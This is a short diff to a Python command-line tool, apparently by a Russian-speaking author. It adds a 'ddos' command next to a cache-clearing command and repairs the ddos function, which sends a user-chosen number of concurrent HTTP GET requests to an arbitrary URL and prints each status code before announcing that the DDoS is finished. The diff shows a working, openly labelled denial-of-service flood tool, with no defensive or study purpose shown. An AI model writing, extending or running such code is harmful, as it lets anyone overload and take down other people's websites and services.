@@ -4,7 +4,8 @@ import time, shutil, os, requests, concurrent.futures
 
 def commands():
     return { 
-        'clearcache': clearcache
+        'clearcache': clearcache,
+        'ddos': ddos
     }
 
 def clearcache(root_dir="."):
@@ -18,9 +19,9 @@ def clearcache(root_dir="."):
     time.sleep(1)
     return restart()
 
-def ddos(url,amount):
+def ddos(url, amount):
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = [executor.submit(requests.get, url) for _ in range(amount)]
+        futures = [executor.submit(requests.get, url) for _ in range(int(amount))]
         for future in concurrent.futures.as_completed(futures):
             print(Fore.BLUE + f"Ответ от {url}: {future.result().status_code}" + Fore.RESET)
-    return print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
+    print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
